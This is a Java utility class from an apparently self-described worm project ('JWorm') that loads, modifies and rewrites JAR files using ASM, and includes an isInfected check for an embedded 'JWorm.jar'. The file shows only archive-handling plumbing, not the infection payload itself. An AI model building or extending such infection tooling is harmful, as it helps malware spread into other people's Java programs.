package com.jworm.util;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.tree.ClassNode;
import org.objectweb.asm.util.CheckClassAdapter;

/**
 * Represents a Jar file.
 *
 * @author Desmond Jackson
 */
public class JavaArchive extends Object {

	/**
	 * The Jar file to represent.
	 */
	private JarFile jarFile;

	/**
	 * The class files found in the represented Jar file.
	 */
	private Map<String, ClassNode> classes = new HashMap<String, ClassNode>();

	/**
	 * The other files found in the represented Jar file.
	 */
	private Map<String, byte[]> otherFiles = new HashMap<String, byte[]>();

	/**
	 * Creates the Jar file representation.
	 * 
	 * @param jarFile The Jar file to represent
	 */
	public JavaArchive(JarFile jarFile) {
		super();
		this.jarFile = jarFile;
		load();
	}

	/**
	 * Loads all of the represented Jar file's entries into memory.
	 */
	private void load() {
		Enumeration<JarEntry> entries = jarFile.entries();
		while (entries.hasMoreElements()) {
			JarEntry entry = entries.nextElement();
			String name = entry.getName();
			if (name.endsWith(".class")) {
				ClassNode node = new ClassNode();
				try {
					ClassReader reader = new ClassReader(jarFile
							.getInputStream(entry));
					reader.accept(node, ClassReader.SKIP_DEBUG |
							ClassReader.SKIP_FRAMES);
					classes.put(name.replace(".class", ""), node);
				} catch (IOException e) {
					e.printStackTrace();
				}
			} else {
				try {
					InputStream in = jarFile.getInputStream(entry);
					byte[] bytes = new byte[1024];
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					int count = 0;
					while ((count = in.read(bytes)) != -1)
						baos.write(bytes, 0, count);
					in.close();
					otherFiles.put(name, baos.toByteArray());
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	/**
	 * Adds a file to the map of other files by name.
	 * 
	 * @param name The name of the file to add
	 */
	public void addFile(String name) {
		try {
			InputStream in = ClassLoader.getSystemResourceAsStream(name);
			byte[] bytes = new byte[1024];
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			int count = 0;
			while ((count = in.read(bytes)) != -1)
				baos.write(bytes, 0, count);
			in.close();
			otherFiles.put(name, baos.toByteArray());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Writes this Java Archive to file.
	 * 
	 * @param file The file to write this Java Archive to
	 */
	public void write(File file) {
		try {
			JarOutputStream jos = new JarOutputStream(new FileOutputStream(file));
			for (Entry<String, ClassNode> entry : classes.entrySet()) {
				ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
				ClassNode node = entry.getValue();
				node.accept(new CheckClassAdapter(writer, true));
				jos.putNextEntry(new JarEntry(node.name.concat(".class")));
				jos.write(writer.toByteArray());
			}
			for (Entry<String, byte[]> entry : otherFiles.entrySet()) {
				jos.putNextEntry(new JarEntry(entry.getKey()));
				jos.write(entry.getValue());
			}
			jos.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Gets whether the represented Jar file is infected or not.
	 * 
	 * @return false if the represented Jar file is not infected
	 */
	public boolean isInfected() {
		return otherFiles.containsKey("JWorm.jar");
	}
	
	/**
	 * Gets the main class as a Class Node.
	 * 
	 * @return null if the main class could not be found
	 */
	public ClassNode getMainClassAsNode() {
		try {
			return classes.get(jarFile.getManifest().getMainAttributes()
					.getValue("Main-Class").replace(".", "/"));
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * Gets the name of the represented Jar file.
	 * 
	 * @return The name of represented Jar file
	 */
	public String getName() {
		return jarFile.getName();
	}

}
